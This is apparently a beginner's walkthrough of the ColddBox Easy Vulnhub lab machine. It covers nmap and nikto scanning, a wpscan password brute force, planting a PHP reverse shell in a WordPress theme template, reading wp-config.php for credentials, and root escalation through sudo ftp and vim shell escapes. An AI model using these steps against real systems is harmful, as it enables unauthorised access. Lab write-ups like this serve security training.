# ColdBox_Easy_Vulnhub_Machine_Walkthrough
ColddBox Easy, it is a Wordpress machine with an easy level of difficulty, highly recommended for beginners in the field.

## Scanning

nmap 192.168.122.112

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled.png)

nmap -sV -A 192.168.122.112

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%201.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%201.png)

nmap -p- 192.168.122.112

nmap -p4512 -sV -A 192.168.122.112

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%202.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%202.png)

nikto -h http://192.168.122.112/

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%203.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%203.png)

### Enumeration

Browsing http://192.168.122.112

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%204.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%204.png)

Found nothing in [http://192.168.122.112/hidden/](http://192.168.122.112/hidden/) directory

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%205.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%205.png)

wp-scan -u [http://192.168.122.112/](http://192.168.122.112/) -e —wordlist /usr/share/seclists/Passwords/darkweb2017-top1000.txt

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%206.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%206.png)

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%207.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%207.png)

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%208.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%208.png)

Found password for user c0ldd: 9876543210

using credential c0ldd: 9876543210 for login

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%209.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%209.png)

starting listener on 4444

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2010.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2010.png)

open theme twetyfifteen and edit on 404 template

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2011.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2011.png)

Copy-Paste php-reverse-shell.php in editor and save

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2012.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2012.png)

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2013.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2013.png)

Open [http://192.168.122.112/](http://192.168.122.112/)wp-content/themes/twentyfifteen/404.php

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2014.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2014.png)

We got shell of www-data

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2015.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2015.png)

cd /home/c0ldd

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2016.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2016.png)

Found user.txt

cd /var/www/html

cat wp-config.php

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2017.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2017.png)

Found password for c0ldd user which is cybersecurity

Connect through ssh

ssh c0ldd@192.168.122.112 -p 4512

password: cybersecurity

cat user.txt

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2018.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2018.png)

### Privilege escalation

sudo -l

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2019.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2019.png)

FTP sudo /usr/bin/ftp 

!/bin/sh

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2020.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2020.png)

vim

sudo vim -c ':!/bin/bash'

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2021.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2021.png)

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2022.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2022.png)

cat root.txt

![ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2023.png](ColdBox%20Easy%20Vulnhub%20Walkthrough%206f9d2048865e44eeba6cc4e39dcb5fe9/Untitled%2023.png)
